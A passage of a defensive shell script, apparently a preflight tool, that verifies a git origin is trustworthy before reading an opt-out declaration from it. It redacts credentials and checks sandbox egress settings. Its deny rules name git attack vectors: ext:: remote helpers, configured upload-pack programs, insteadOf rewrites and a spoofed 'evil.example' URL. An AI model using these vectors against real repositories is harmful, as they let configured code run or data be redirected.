      # it is NOT trusted (a person runs preflight from the superproject).
      _gt_kind=submodule
      return 1 ;;
  esac
  return 1
}
boundary_refuse_gitdir() {  # the refusal for a git dir outside the tree that boundary_gitdir_trusted did not vouch for
  if [ "$_gt_kind" = submodule ]; then
    boundary_refuse git-dir-outside "the git directory is outside this tree (a submodule checkout, whose gitdir and .gitmodules entry an agent can write), so origin is not this project's" "run preflight from the superproject"
  else
    boundary_refuse git-dir-outside "the git directory is outside this tree and git's own records do not vouch for it (a symlinked .git, or a .git pointer with no matching linked-worktree entry), so origin is not this project's" "run it from the repository's own main worktree or a real 'git worktree add' checkout"
  fi
}
boundary_url_host() {  # <url> -> its lower-case host (empty for a path)
  case "$1" in
    # S23: the authority ends at the FIRST of / ? # (so `https://evil.example#@good.example/` is host evil.example); an IPv6 `[` host keeps its `[` and the remedy counts it as a change
    *://*) _bh=${1#*://}; _bh=${_bh%%/*}; _bh=${_bh%%\?*}; _bh=${_bh%%#*}; _bh=${_bh##*@}; _bh=${_bh%%:*} ;;
    *:*) _bh=${1%%:*}; _bh=${_bh##*@} ;;
    *) _bh="" ;;
  esac
  printf '%s' "$_bh" | tr 'A-Z' 'a-z'
}
boundary_url_path() {  # <url> -> its path with the leading / or : and a trailing / and .git stripped (empty for a path-less value)
  case "$1" in
    *://*)
      _bp=${1#*://}
      case "$_bp" in
        */*) _bp=${_bp#*/} ;;
        *) _bp="" ;;
      esac ;;
    *:*) _bp=${1#*:} ;;
    *) _bp="" ;;
  esac
  _bp=${_bp#/}; _bp=${_bp%/}; _bp=${_bp%.git}
  printf '%s' "$_bp"
}
# The remedy for a rewritten origin. It never tells the user to adopt a URL on another HOST, and it prints a set-url command only for a plain, safe URL (so no
# attacker text reaches a copy-pasted shell). The rule and its file are named; they are printed as data, never inside a command.
boundary_rewrite_remedy() {  # <stored url> <effective url> -> the remedy text
  _rw_tab=$(printf '\t')
  _rw_rule=$(git config --show-origin --get-regexp '^url\..*\.insteadof$' 2>/dev/null | while IFS= read -r _rw_l; do
    _rw_r=${_rw_l#*"$_rw_tab"}; _rw_v=${_rw_r#* }
    if [ "${1#"$_rw_v"}" != "$1" ]; then printf '%s in %s' "${_rw_r%% *}" "${_rw_l%%"$_rw_tab"*}" | tr -cd '[:print:]'; break; fi
  done)
  _rw_m=""; [ -z "$_rw_rule" ] || _rw_m="; matched: $(boundary_url_show "$_rw_rule")"
  _rw_t="origin is rewritten by a url.<...>.insteadOf rule (git config --show-origin --get-regexp '^url\\.' shows where$_rw_m)"
  _rw_h1=$(boundary_url_host "$1"); _rw_h2=$(boundary_url_host "$2")
  case "$_rw_h1$_rw_h2" in   # an IPv6 host is never judged equal
    *'['*) _rw_h2="[$_rw_h2" ;;
  esac
  if [ "$_rw_h1" != "$_rw_h2" ]; then
    printf '%s' "$_rw_t; the rewrite changes the HOST: do NOT adopt it unless you know it; remove that rule"; return 0
  fi
  # S21: set-url is offered ONLY for a pure transport swap (same host, same repository path); any other rewrite changes the REPOSITORY.
  if [ "$(boundary_url_path "$1")" != "$(boundary_url_path "$2")" ]; then   # MUT-REPO
    printf '%s' "$_rw_t; the rewrite changes the REPOSITORY: do NOT adopt it; remove that rule"; return 0
  fi
  _bu_s=$(boundary_url_show "$2")
  if [ "$_bu_s" != "$2" ] && printf '%s' "$2" | tr -cd '[:print:]' | grep -Eq '@'; then   # userinfo present: it never reaches a command
    printf "%s; remove that rule, or if the rewrite is your own SSH preference, confirm the effective URL is your forge and then run: git remote set-url origin '<your forge URL>'" "$_rw_t"
  elif [ "$_bu_s" = "$2" ] && printf '%s' "$_bu_s" | grep -Eq '^(https://|ssh://|git@)[A-Za-z0-9._~:/@%+-]+$'; then   # MUT-URLSAFE
    printf "%s; remove that rule, or if the rewrite is your own SSH preference, confirm the effective URL is your forge and then run: git remote set-url origin '%s'" "$_rw_t" "$_bu_s"
  else
    printf '%s' "$_rw_t; remove that rule (no safe set-url command is offered for this URL)"
  fi
}
boundary_url_show() {  # <url or text holding one>: THE one redaction every printed URL goes through. Printable bytes only; any userinfo becomes ***, except exactly `git` with no password and a single @ in the authority; an scp-like user:secret@host too
  _bs_mk=$(printf '\001'); _bs_m2=$(printf '\002')
  # S22: an scp-like `user@host:path` redacts the user unless it is exactly `git` (a token pasted as the user would otherwise print)
  # m2: a git config rule name starts `url.`; that prefix is the rule's NAME and stays readable, only the URL part after it is redacted
  _bs_pre=""; _bs_in=$1
  case "$1" in
    url.*) _bs_pre=url.; _bs_in=${1#url.} ;;
  esac
  printf '%s' "$_bs_pre"
  printf '%s' "$_bs_in" | tr -cd '[:print:]' | sed -e "s#://git@\([^/@]*\)/#://${_bs_mk}\1/#" -e "s#://git@\([^/@]*\)\$#://${_bs_mk}\1#" -e "s#^git@\([^@]*\)\$#${_bs_m2}\1#" -e 's#\(://\)[^/]*@#\1***@#g' -e 's#^[^/@]*:[^/@]*@#***@#' -e 's#^[^/@:][^/@:]*@#***@#' -e "s#://${_bs_mk}#://git@#" -e "s#^${_bs_m2}#git@#"   # MUT-REDACT
}
_bo_nonforge='origin must be a network forge URL (https or ssh); this check can'"'"'t verify a local or unrecognised origin'
boundary_url_kind() {  # <url>: prints remote | local | helper. The ONE classifier: boundary_origin_fetch refuses on it and --url-kind (doctor, kit-current) reads it. No git runs here.
  case "$1" in
    *::*) printf '%s\n' helper ;;
    ssh://*|git+ssh://*|https://*|http://*|git://*) printf '%s\n' remote ;;
    file:*|/*|.*|'~'*) printf '%s\n' local ;;
    *://*) printf '%s\n' helper ;;
    *:*)
      case "${1%%:*}" in
        */*) printf '%s\n' local ;;
        *) printf '%s\n' remote ;;
      esac ;;
    *) printf '%s\n' local ;;
  esac
}
boundary_origin_fetch() {  # <outfile>: rc 0 written | 1 absent | 2 not a regular file | 3 unreadable (BD_WHY says why) | 4 UNTRUSTED (BD_WHY, BD_REMEDY). Two ls-remote calls, no fetch.
  BD_REMEDY=""; BD_MOVED=""; _gt_common=""; _gt_kind=""; _bo_retry=0  # _bo_retry=1 marks a failure worth ONE automatic retry (a network blip), never an integrity or structural refusal
  # A redirected git environment or a nested tree would read a repository this directory does not own: preflight refuses both, but only a few lines after this call.
  if git_env_redirected; then boundary_refuse git-env "the git environment is redirected (GIT_DIR or GIT_WORK_TREE), so origin is not this project's"; return $?; fi
  owns_itself "$PWD" || { boundary_refuse not-own-root "this directory is not the root of its own git repository, so origin is not this project's"; return $?; }
  # S10: a worktree, a submodule or a symlinked .git keeps its git dir outside this tree, so its origin is not this project's (preflight's own refusal is the same test).
  # A linked worktree or a submodule whose back-links agree is trusted (boundary_gitdir_trusted); a symlinked .git or a pointer with no back-link is not.
  if ! boundary_gitdir_trusted "$PWD"; then boundary_refuse_gitdir; return $?; fi   # MUT-GITDIR
  # S1: a git environment redirected by variable, or an effective origin URL that is not the one this repository stores, reads a repository this directory does not
  # own (url.*.insteadOf from the global or system config, include / includeIf). The declaration then reads UNVERIFIED and no remote is contacted.
  for _bo_v in GIT_CONFIG_GLOBAL GIT_CONFIG_SYSTEM GIT_CONFIG_COUNT GIT_CONFIG_PARAMETERS GIT_COMMON_DIR GIT_OBJECT_DIRECTORY GIT_EXEC_PATH; do
    eval "_bo_set=\${$_bo_v+x}"
    if [ -n "$_bo_set" ]; then boundary_refuse env-redirect "the git environment is redirected ($_bo_v is set), so origin is not this project's" "unset $_bo_v (only its name is printed, never its value)"; return $?; fi   # MUT-ENVSET
  done
  _bo_eff=$(git remote get-url origin 2>/dev/null) || { boundary_refuse no-origin "no origin remote" "add your forge as origin: git remote add origin '<your forge URL>'"; return $?; }
  _bo_loc=$(git config --local --get remote.origin.url 2>/dev/null) || _bo_loc=""
  if [ -z "$_bo_loc" ] || [ "$_bo_eff" != "$_bo_loc" ]; then boundary_refuse url-differs "the effective origin URL differs from this repository's own remote.origin.url (url.*.insteadOf or an include), so origin is not this project's" "$(boundary_rewrite_remedy "$_bo_loc" "$_bo_eff")"; return $?; fi   # MUT-URLDIFF
  if [ -n "$_gt_common" ]; then   # a linked worktree: the origin is the common dir's own, not a per-worktree override
    _bo_cc=$(git config -f "$_gt_common/config" --get remote.origin.url 2>/dev/null) || _bo_cc=""
    if [ "$_bo_cc" != "$_bo_loc" ]; then boundary_refuse url-differs "the origin URL of this worktree is not the one its main repository stores, so origin is not this project's" "run it from the repository's own main worktree"; return $?; fi
  fi
  # S8: an effective origin that is a local path or file:// is a directory the agent can write, not a remote (the selftest's local bare repositories are allowed only under a seam flag).
  # S13: default-deny. Only ssh://, git+ssh://, https://, http://, git:// and scp-like [user@]host:path (no slash in the host part, no "::") are remotes; a "::" form
  # (a remote helper such as ext::) or any other scheme is refused before ls-remote can run it.
  _bo_lp=0; _bo_hx=0
  case "$(boundary_url_kind "$_bo_eff")" in
    helper) _bo_hx=1 ;;
    local) _bo_lp=1 ;;
  esac
  if [ "$_bo_hx" -eq 1 ]; then boundary_refuse helper-origin "the effective origin is a remote-helper or unrecognised URL form, so it is not a remote this declaration can be trusted from" "$_bo_nonforge"; return $?; fi   # MUT-HELPER
  if [ "$_bo_lp" -eq 1 ] && { [ "${SEAMS:-0}" -eq 0 ] || [ -n "${PREFLIGHT_BOUNDARY_REFUSE_LOCAL:-}" ]; }; then boundary_refuse local-origin "the effective origin is a local path or a file:// URL, so it is not a remote this declaration can be trusted from" "$_bo_nonforge"; return $?; fi   # MUT-LOCALPATH
  # S8: a configured upload-pack or helper program runs whatever the config names in place of git's own transport, in any scope.
  _bo_key=""; git config --get remote.origin.uploadpack >/dev/null 2>&1 && _bo_key=remote.origin.uploadpack; [ -n "$_bo_key" ] || { git config --get remote.origin.vcs >/dev/null 2>&1 && _bo_key=remote.origin.vcs; }
  if [ -n "$_bo_key" ]; then boundary_refuse uploadpack "remote.origin.uploadpack or remote.origin.vcs is set, so the origin read would run a configured program" "git config --unset $_bo_key (in whichever scope sets it: local, global or system)"; return $?; fi   # MUT-UPLOADPACK
  # S13 belt: no ext:: helper, and (outside the selftest's seam, whose fixtures are local bare repositories) no file transport.
  _bo_belt='-c protocol.ext.allow=never'; [ "${SEAMS:-0}" -eq 0 ] && _bo_belt="$_bo_belt -c protocol.file.allow=never"   # MUT-BELT
  _bo_hd=$(env GIT_TERMINAL_PROMPT=0 GIT_SSH_COMMAND="$_bo_ssh" git -c http.lowSpeedLimit=1000 -c http.lowSpeedTime=20 $_bo_belt ls-remote --symref origin HEAD 2>/dev/null | awk '$1 == "ref:" && $3 == "HEAD" { print $2; exit }' || true)
  case "$_bo_hd" in
    refs/heads/?*) ;;
    *) _bo_hd=refs/heads/main ;;
  esac
  case "$_bo_hd" in
    *[!A-Za-z0-9._/-]*) _bo_hd=refs/heads/main ;;
  esac
  _bo_tip=$(env GIT_TERMINAL_PROMPT=0 GIT_SSH_COMMAND="$_bo_ssh" git -c http.lowSpeedLimit=1000 -c http.lowSpeedTime=20 $_bo_belt ls-remote origin "$_bo_hd" 2>/dev/null | awk -v r="$_bo_hd" '$2 == r { s = $1; n++ } END { if (n == 1) print s }' || true)
  case "$_bo_tip" in
    ''|*[!0-9a-f]*) BD_WHY="origin's default branch could not be read (offline, or no access)"; BD_CAUSE=net; _bo_retry=1; return 3 ;;
  esac
  if ! GIT_NO_REPLACE_OBJECTS=1 git cat-file -e "${_bo_tip}^{commit}" 2>/dev/null; then
    boundary_tip_unfetched "$_bo_hd" "$_bo_tip" || return $?   # MUT-TIPCALL
  fi
  # S4: at most 4097 bytes are read, so a blob over the 4 KiB cap is still detectable (the parser refuses it) and nothing larger is pulled into the scratch file.
  # M3: the caller's scratch directory is private (mktemp -d), so the side file for the pipeline's rc is not a predictable sibling in a shared TMPDIR.
  _bo_rcf=${1%/*}/rc; rm -f "$_bo_rcf"
  { boundary_rel_blob "$_bo_tip" .kit/boundary-optout.conf; echo "$?" > "$_bo_rcf"; } | head -c 4097 > "$1"   # MUT-WTREAD
  _bo_rc=$(cat "$_bo_rcf" 2>/dev/null) || _bo_rc=3; rm -f "$_bo_rcf"
  if [ "$(wc -c < "$1" | tr -d ' ')" -gt 4096 ]; then return 0; fi   # MUT-HEADCAP: over the cap: the parser says so
  case "$_bo_rc" in
    0|1|2) return "$_bo_rc" ;;
  esac
  BD_WHY="the declaration blob could not be read"; BD_CAUSE=net; _bo_retry=1; return 3
}
# The ONE place that handles an origin default-branch tip that is not fetched here (it advanced since the last fetch). A retry cannot help, so none is made.
# Owner ruling "Let's go with your recommendation on three" (D-241026-2): the declaration is then read from the LOCAL remote-tracking ref refs/remotes/origin/<default>
# (the last fetch) with the same checks, and the line says "origin has moved". Only when NO such ref exists is it UNVERIFIED (remedy: a fetch). A fetch refspec that does
# not fetch the default branch into that ref is UNTRUSTED. <default ref>: sets _bo_tip (the local commit) and BD_MOVED (its date) and returns 0, or returns 3 / 4.
boundary_tip_unfetched() {  # <refs/heads/X>
  _bt_br=${1#refs/heads/}
  _bt_ok=0; _bt_neg=0
  _bt_spec=$(git config --get-all remote.origin.fetch 2>/dev/null) || _bt_spec=""
  _bt_ifs=$IFS; IFS=$_bd_nl; set -f
  for _bt_s in $_bt_spec; do
    case "$_bt_s" in
      '^'*)   # S31: a negative refspec excludes only if it matches the default branch (the pattern is a glob; set -f is on, case still matches it)
        _bt_p=${_bt_s#^}
        # shellcheck disable=SC2254  # deliberate: the refspec pattern is a glob and must match as one
        case "refs/heads/$_bt_br" in
          $_bt_p) _bt_neg=1 ;;
        esac ;;
      "+refs/heads/*:refs/remotes/origin/*"|"refs/heads/*:refs/remotes/origin/*") _bt_ok=1 ;;
      "+refs/heads/$_bt_br:refs/remotes/origin/$_bt_br"|"refs/heads/$_bt_br:refs/remotes/origin/$_bt_br") _bt_ok=1 ;;
      *":refs/remotes/origin/$_bt_br") _bt_neg=1 ;;   # S38: an extra refspec that maps some OTHER source onto the default branch's tracking ref (the ok forms are matched above)
    esac
  done
  set +f; IFS=$_bt_ifs
  if [ "$_bt_ok" -eq 0 ] || [ "$_bt_neg" -eq 1 ]; then   # MUT-REFSPEC
    boundary_refuse fetch-refspec "remote.origin.fetch does not fetch origin's default branch into refs/remotes/origin/$_bt_br, so the local copy of the declaration is not origin's" "restore the default fetch refspec: git config remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'"
    return $?
  fi
  # S29 (cell measured on git 2.48.1; on an older git for-each-ref may skip a ref whose object is missing, which fails toward the stated residual): the fallback fires whenever origin's tip object is absent locally, which a local agent can cause (delete the loose object, then forge the tracking ref). If ANY local
  # ref (or HEAD) names the tip while its object is missing, the absence is local damage and not origin having moved: UNTRUSTED, never the fallback.
  _bt_refs=$( { git for-each-ref --format='%(objectname)' 2>/dev/null; git rev-parse HEAD 2>/dev/null; } )
  case "$_bd_nl$_bt_refs$_bd_nl" in
    *"$_bd_nl$2$_bd_nl"*)   # MUT-TIPMISSING
      boundary_refuse tip-object-missing "a local ref names origin's tip but its object is missing, so the absence is local and origin has not simply moved" "a local ref names origin's tip but its object is missing; run git fetch origin"
      return $? ;;
  esac
  _bt_loc=$(GIT_NO_REPLACE_OBJECTS=1 git rev-parse --verify -q "refs/remotes/origin/$_bt_br^{commit}" 2>/dev/null) || _bt_loc=""
  case "$_bt_loc" in
    ''|*[!0-9a-f]*) BD_WHY="origin's default branch tip is not fetched here, and no remote-tracking ref exists to read instead (git fetch origin)"; BD_CAUSE=tip; _bo_retry=0; return 3 ;;   # MUT-NOREF
  esac
  _bo_tip=$_bt_loc   # MUT-TRACKING
  BD_MOVED=$(GIT_NO_REPLACE_OBJECTS=1 git log -1 --format=%cs "$_bt_loc" 2>/dev/null) || BD_MOVED=""   # S30: a replace ref cannot fake the date
  [ -n "$BD_MOVED" ] || BD_MOVED="an unknown date"
  return 0
}
# One remedy per UNVERIFIED cause (S27): a single reflexive "--boundary-offline" would train its use. An unknown cause (the seam, a scratch failure) gets the network remedy.
boundary_unv_remedy() {  # reads BD_CAUSE
  case "$BD_CAUSE" in
    tip) printf '%s' "git fetch origin, then re-run" ;;
    not-own-root) printf '%s' "run preflight from the repository root" ;;
    git-env) printf '%s' "unset GIT_DIR and GIT_WORK_TREE" ;;
    *) printf '%s' "retry when online, or type --boundary-offline" ;;
  esac
}
# S20: the origin read is tried, and retried ONCE (after a pause) when the failure may be a network blip. The seam BLIP fails the first attempt only (selftest).
boundary_fetch_retry() {  # <outfile> -> the rc of boundary_origin_fetch after at most one retry
  _bf_first=1
  boundary_fetch_try "$1" && return 0
  _bf_rc=$?
  [ "$_bf_rc" -eq 3 ] && [ "$_bo_retry" -eq 1 ] || return "$_bf_rc"   # MUT-RETRY
  if [ "${SEAMS:-0}" -eq 1 ]; then sleep 0; else sleep 2; fi
  _bf_first=0
  boundary_fetch_try "$1"
}
boundary_fetch_try() {  # <outfile>
  if [ "${SEAMS:-0}" -eq 1 ] && [ -n "${PREFLIGHT_BOUNDARY_BLIP:-}" ] && [ "$_bf_first" -eq 1 ]; then
    BD_WHY="origin's default branch could not be read (offline, or no access)"; _bo_retry=1; return 3
  fi
  boundary_origin_fetch "$1"
}
boundary_date_ok() {  # <YYYY-MM-DD> -> 0 iff a real calendar date (years 2000-2099), not after today
  case "$1" in
    20[0-9][0-9]-[01][0-9]-[0-3][0-9]) ;;
    *) return 1 ;;
  esac
  _bt_y=${1%%-*}; _bt_m=${1#*-}; _bt_d=${_bt_m#*-}; _bt_m=${_bt_m%%-*}; _bt_m=${_bt_m#0}; _bt_d=${_bt_d#0}
  case "$_bt_m" in
    1|3|5|7|8|10|12) _bt_max=31 ;;
    4|6|9|11) _bt_max=30 ;;
    2) _bt_max=28
       if [ $((_bt_y % 4)) -eq 0 ] && { [ $((_bt_y % 100)) -ne 0 ] || [ $((_bt_y % 400)) -eq 0 ]; }; then _bt_max=29; fi ;;
    *) return 1 ;;
  esac
  { [ "$_bt_d" -ge 1 ] && [ "$_bt_d" -le "$_bt_max" ]; } || return 1
  [ "$(expr "$1" \> "$(date +%Y-%m-%d)")" = 0 ]   # the LOCAL date (R4): an author east of UTC writes today's local date, which is tomorrow in UTC for part of the day
}
boundary_decl_record() {  # <line>: rc 0 and sets _br_part, _br_since and _br_lost | rc 1 and sets BD_WHY to the broken rule
  _br_l=$1
  [ "${#_br_l}" -le 512 ] || { BD_WHY="a line is over 512 bytes"; return 1; }
  case "$_br_l" in
    part=*" reason="*" lost="*" since="*) ;;
    *) BD_WHY="the fields must be part, reason, lost, since, in that order"; return 1 ;;
  esac
  [ "$(printf '%s' "$_br_l" | tr -cd '=' | wc -c | tr -d ' ')" = 4 ] || { BD_WHY="a value contains '='"; return 1; }   # MUT-EQ
  _br_part=${_br_l#part=}; _br_part=${_br_part%% reason=*}
  _br_rest=${_br_l#*" reason="}; _br_reason=${_br_rest%% lost=*}
  _br_rest=${_br_rest#*" lost="}; _br_lost=${_br_rest%% since=*}; _br_since=${_br_rest#*" since="}
  for _br_v in "$_br_part" "$_br_reason" "$_br_lost" "$_br_since"; do
    case "$_br_v" in
      ''|' '*|*' ') BD_WHY="a value is empty or has a leading or trailing space"; return 1 ;;
    esac
  done
  case "$_br_part" in
    read-deny|egress|write-protect|local-bind|all) ;;   # local-bind (SWAS-945) names a GRANT that is ON; the other three name a protection that is OFF
    *) BD_WHY="an unknown part name"; return 1 ;;
  esac
  boundary_date_ok "$_br_since" || { BD_WHY="since is not a real date, or is in the future"; return 1; }
  return 0
}
boundary_decl_parse() {  # <file>: sets BD_STATE (ok | malformed), BD_WHY and BD_RECS from the blob (printable ASCII, 4 KiB, 4 records)
  BD_STATE=malformed; BD_RECS=""; BD_WHY=""
  [ "$(wc -c < "$1" | tr -d ' ')" -le 4096 ] || { BD_WHY="the file is over 4 KiB"; return 0; }
  [ "$(LC_ALL=C tr -d '\012\040-\176' < "$1" | wc -c | tr -d ' ')" = 0 ] || { BD_WHY="the file holds a control byte, a CR, a BOM or a non-ASCII byte"; return 0; }
  _bp_n=0; _bp_recs=0; _bp_seen=" "; _bp_acc=""
  while IFS= read -r _bp_l || [ -n "$_bp_l" ]; do
    _bp_n=$((_bp_n + 1))
    case "$_bp_l" in
      ''|'#'*) continue ;;
    esac
    if ! boundary_decl_record "$_bp_l"; then BD_WHY="line $_bp_n: $BD_WHY"; return 0; fi   # MUT-MALFORMED
    _bp_recs=$((_bp_recs + 1))
    [ "$_bp_recs" -le 4 ] || { BD_WHY="line $_bp_n: more than 4 records"; return 0; }   # MUT-CAP
    case "$_bp_seen" in
      *" $_br_part "*) BD_WHY="line $_bp_n: part appears twice"; return 0 ;;
    esac
    _bp_seen="$_bp_seen$_br_part "
    _bp_acc="$_bp_acc$_br_part $_br_since $_br_lost$_bd_nl"
  done < "$1"
  case "$_bp_seen" in
    *" all "*) [ "$_bp_seen" = " all " ] || { BD_WHY="part=all appears with another part (one meaning per file)"; return 0; } ;;
  esac
  BD_RECS=$_bp_acc; BD_STATE=ok
}
boundary_decl_load() {  # sets BD_STATE (absent | ok | malformed | unreadable), BD_WHY, BD_RECS. The seam stands in for origin ONLY under a seam flag.
  BD_STATE=unreadable; BD_WHY=""; BD_RECS=""; BD_REMEDY=""; BD_CAUSE=""; BD_MOVED=""
  _bl_d=$(mktemp -d 2>/dev/null) || { BD_WHY="no scratch directory could be created"; return 0; }; _bl_f=$_bl_d/decl
  _bl_rc=0
  if [ "${SEAMS:-0}" -eq 1 ]; then
    case "${PREFLIGHT_BOUNDARY_OPTOUT:-}" in
      ''|@unreadable) BD_WHY="no origin read under the selftest"; _bl_rc=3 ;;
      real) boundary_fetch_retry "$_bl_f" || _bl_rc=$? ;;
      @absent) _bl_rc=1 ;;
      @nonregular) _bl_rc=2 ;;
      *) if [ -f "$PREFLIGHT_BOUNDARY_OPTOUT" ] && [ ! -L "$PREFLIGHT_BOUNDARY_OPTOUT" ]; then cp -- "$PREFLIGHT_BOUNDARY_OPTOUT" "$_bl_f" || _bl_rc=3; else _bl_rc=2; fi ;;
    esac
  else
    boundary_fetch_retry "$_bl_f" || _bl_rc=$?
  fi
  case "$_bl_rc" in
    0) boundary_decl_parse "$_bl_f" ;;
    1) BD_STATE=absent ;;
    2) BD_STATE=malformed; BD_WHY="the entry on origin's default branch is not a regular file" ;;   # MUT-NONREG
    4) BD_STATE=untrusted ;;
    *) BD_STATE=unreadable; [ -n "$BD_WHY" ] || BD_WHY="the declaration could not be read" ;;
  esac
  rm -rf "$_bl_d"
}
bd_lookup() {  # <part> [exact] -> 0 and sets _bcs and _bcl when the declaration names <part> (or, unless "exact", part=all)
  _bl_r=$(printf '%s\n' "$BD_RECS" | sed -n "s/^$1 //p" | head -1)
  if [ -z "$_bl_r" ] && [ "${2:-}" != exact ]; then _bl_r=$(printf '%s\n' "$BD_RECS" | sed -n 's/^all //p' | head -1); fi
  [ -n "$_bl_r" ] || return 1
  _bcs=${_bl_r%% *}; _bcl=${_bl_r#* }
}
bd_covered() {  # <tokens: a part, @all or @every> -> 0 iff every token is declared; leaves the first record's since and lost in _bcs and _bcl
  _bc_ok=0; _bc_s=""; _bc_l=""
  for _bc_t in $1; do
    case "$_bc_t" in
      @all) bd_lookup all exact || return 1 ;;
      @every)
        if ! bd_lookup all exact; then
          bd_lookup read-deny exact && bd_lookup write-protect exact && bd_lookup egress exact || return 1
        fi ;;
      =*) bd_lookup "${_bc_t#=}" exact || return 1 ;;   # MUT-LBEXACT: a grant is declared by its own record only; part=all does not cover it
      *) bd_lookup "$_bc_t" || return 1 ;;
    esac
    [ -n "$_bc_s" ] || { _bc_s=$_bcs; _bc_l=$_bcl; }
    _bc_ok=1
  done
  [ "$_bc_ok" -eq 1 ] || return 1
  _bcs=$_bc_s; _bcl=$_bc_l
}
# boundary_judge <name> <STATE> <detail> <tokens> <consequence> <fix> [kit sentence]: one FAIL line (a WARN line when declared) graded against the declaration (_bds). Only the UNDECLARED
# branch sets bfail; a declared one is loud and does not, and an unreadable or unread declaration is never a pass but is not UNDECLARED either.
boundary_judge() {
  _bj_dp=""; [ -z "$3" ] || _bj_dp=" ($3)"
  case "$_bds" in
    unread)
      printf '%s\n' "  FAIL $1: $2$_bj_dp $_bleg ($_bcin; the declaration is not read in CI) — $5"; bunv=1 ;;
    unreadable)
      printf '%s\n' "  FAIL $1: $2$_bj_dp, declaration UNVERIFIED $_bleg (could not read .kit/boundary-optout.conf on origin's default branch: $BD_WHY) — $5"; bunv=1 ;;
    offline)   # a human typed --boundary-offline: the line is loud, the run does not fail on it, and nothing is counted as declared
      printf '%s\n' "  FAIL $1: $2$_bj_dp, declaration not verified $_bleg (--boundary-offline) — $5" ;;
    *)
      if [ "$_bds" = ok ] && bd_covered "$4"; then
        # owner ruling "Let's proceed with your Warn recommendation" (amends D-241023-2 4(c)): the declared opt-out is loud (WARN) and exits 0.
        # The kit's own consequence sentence is printed once: when the repo's lost= sentence is identical to it, the "(kit: ...)" suffix is dropped.
        _bj_k=${7:-$5}; _bj_ks=" (kit: $_bj_k)"; [ "$_bcl" != "$_bj_k" ] || _bj_ks=""
        printf '%s\n' "  WARN $1: $2$_bj_dp $_bleg ($_bj_act $_bcs, declared in .kit/boundary-optout.conf). Lost: $_bcl$_bj_ks"   # MUT-DECLWARN
        bwarn=$((${bwarn:-0} + 1))   # MUT-BWARN: SWAS-793, a boundary notice for the summary line (display only: never miss, rec, bfail or bunv)
        :   # MUT-DECLARED
      else
        _bj_mv=""; [ -z "${BD_MOVED:-}" ] || _bj_mv=" origin has moved: git fetch origin, then re-run"   # m3: the declaration may be on the new tip
        printf '%s\n' "  FAIL $1: $2$_bj_dp and UNDECLARED $_bleg — $5. Fix: $6$_bj_mv"
        bfail=1   # MUT-BFAIL
        case "$1" in egress) _bnd_egress_gap=1 ;; *) _bnd_nonegress=1 ;; esac   # MUT-EGRESSGAP: SWAS-474, only the UNDECLARED branch; a declared egress opt-out (the WARN branch above) never sets it
      fi ;;
  esac
}
boundary_stale() {  # doctor --boundary only: a recorded part that is ON in this checkout is a STALE declaration (a warn, never an exit)
  for _bs_p in read-deny write-protect egress all; do
    bd_lookup "$_bs_p" exact || continue
    case "$_bs_p" in
      read-deny) _bs_st=$_prd ;;
      write-protect) _bs_st=$_pwr ;;
      egress) _bs_st=$_peg ;;
      *) _bs_st=OFF; [ "$_prd$_pwr$_peg" != ONONON ] || _bs_st=ON ;;
    esac
    [ "$_bs_st" != ON ] || printf '%s\n' "  warn boundary: declaration for part=$_bs_p is STALE (the part is ON in this checkout)"   # MUT-STALE
  done
  # SWAS-945: a GRANT is stale the other way round: declared while the effective allowLocalBinding is not true (the protection is back, nothing to declare)
  [ "${_blbs:-OFF}" != OFF ] || ! bd_lookup local-bind exact || printf '%s\n' "  warn boundary: declaration for part=local-bind is STALE (allowLocalBinding is not true in this checkout)"   # MUT-LBSTALE
}
boundary_user_hosts() {  # <user settings file>: how many hosts the user-level allowedDomains holds. A COUNT, never a host (SWAS-407 owns the grading).
  [ -f "$1" ] || return 0
  _bh_n=$(jq -r '.sandbox.network.allowedDomains | if type == "array" then length else 0 end' "$1" 2>/dev/null) || _bh_n=unreadable
  case "$_bh_n" in
    ''|*[!0-9]*) printf '%s\n' "  warn egress: the user-level allowedDomains could not be counted (UNVERIFIED)"; bunv=1; bwarn=$((${bwarn:-0} + 1)) ;;
    *) printf '%s\n' "  info egress: the user-level allowedDomains holds $_bh_n host(s); under strictAllowlist this is the whole list (project allowedDomains are ignored, D1 measured) and no kit check grades it (SWAS-407)" ;;
  esac
}
# boundary_egress_block (SWAS-474): printed right after the UNDECLARED "egress NOT ENFORCED" FAIL line, and only there. It prints the user-level block to copy whole, built with jq so it is valid JSON,
# and it carries NO host: every host comes from repo content (the project settings file, .kit/tracker.conf) that a cloned or forked repo controls, so each is printed apart, under its file's label, for the
# human to review before it goes into the machine-wide file. Both host sources go through ONE grammar (the exact-host grammar of DC20), and the whole captured string is guarded against a newline (the jq
# line anchors would match a line of a multi-line value). Every line starts with four spaces or "  info egress:", never "  warn", so the SWAS-793 notice count stays true. Display only: no verdict, no exit.
boundary_egress_block() {
  _eb_okh='def okhost: type == "string" and test("^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$") and test("[a-z][a-z0-9-]*$");'
  _eb_ph=""; _eb_pd=0; _eb_pok=0
  if [ "${_bpread:-0}" -eq 1 ] && [ ! -L "$_bfile" ]; then   # the project scope was readable (recorded in the scope loop); a symlinked file is treated as unreadable here (SWAS-474 S2: its target is not the repo's file)
    _eb_r=$(jq -r "$_eb_okh"'[.sandbox.network.allowedDomains | if type == "array" then .[] else empty end] as $a | ([$a[] | select(okhost)] | unique | .[:50]) as $h
      | "\(($a | length) - ($h | length)) \($h | join(" "))"' "$_bfile" 2>/dev/null) || _eb_r=unreadable
    case "$_eb_r" in *"$_bd_nl"*) _eb_r=unreadable ;; esac
    _eb_pd=${_eb_r%% *}; _eb_ph=${_eb_r#* }
    case "$_eb_pd" in ''|*[!0-9]*) _eb_pok=0 ;; *) _eb_pok=1 ;; esac
  fi
  [ "$_eb_pok" -eq 1 ] || { _eb_ph=""; _eb_pd=0; }
  _eb_th=""
  if [ -f .kit/tracker.conf ]; then   # the md backend has no tracker.conf: no label and no call. tracker-conf.sh get refuses a non-https URL, userinfo, a query, a fragment, an uppercase host and a non-digit port (rc 1, nothing printed)
    _eb_tu=$(sh "$(dirname -- "$0")/tracker-conf.sh" get base_url .kit/tracker.conf 2>/dev/null) || _eb_tu=""
    _eb_tu=${_eb_tu#https://}; _eb_tu=${_eb_tu%%/*}; _eb_tu=${_eb_tu%%:*}   # scheme, path and port stripped
    _eb_th=$(jq -rn --arg h "$_eb_tu" "$_eb_okh"'if ($h | okhost) then $h else empty end' 2>/dev/null) || _eb_th=""
